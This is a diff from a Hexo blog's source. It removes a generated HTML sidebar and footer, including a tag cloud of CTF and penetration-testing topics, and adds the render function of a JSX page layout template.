-      <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/home/" style="font-size: 10px;">home</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/09/18/hello-world/">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2023/09/18/home/">home</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/30/linux%E6%8F%90%E6%9D%83/">linux提权</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/19/venus/">venus</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/11/flower/">flower</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2023 honkerZ<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+        let isPageOrPost = page.layout == 'page' || page.layout == 'post';
+        return <html lang={language ? language.substr(0, 2) : ''}>
+            <Head site={site} config={config} helper={helper} page={page} />
+            <body className={`is-${columnCount}-column has-navbar-fixed-top`}>
+                <Navbar config={config} helper={helper} page={page} />
+                <script type="text/javascript" src={my_cdn(url_for('/js/theme-setting.js'))}></script>
+                <section class="section">
+                    <div class="container">
+                        <div class="columns">
+                            <div class={classname({
+                                column: true,
+                                'order-2': true,
+                                'column-main': true,
+                                'is-12': columnCount === 1,
+                                'is-8-tablet is-8-desktop is-6-widescreen': (page.layout != 'post' && page.layout != 'page') && columnCount === 3,
+                                'is-8-tablet is-8-desktop is-9-widescreen': columnCount === 2 || page.layout === 'post'
+                            })} dangerouslySetInnerHTML={{__html: indexTopData + body}}></div>
+                            <Widgets site={site} config={config} helper={helper} page={page} position={'left'}/>
+                            {isPageOrPost ? null : <Widgets site={site} config={config} helper={helper} page={page} position={'right'}/>}
+                        </div>
+                    </div>
+                </section>
+                <Footer config={config} helper={helper} />
+                <Scripts site={site} config={config} helper={helper} page={page} />
+                <Search config={config} helper={helper} />
+                {use_pjax ? <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> : null}
+                {use_pjax ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: pjaxJs }}></script> : null}
+                {isMath ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: mathJaxJs }}></script> : null}
+            </body>
+        </html>;
+    }
+};
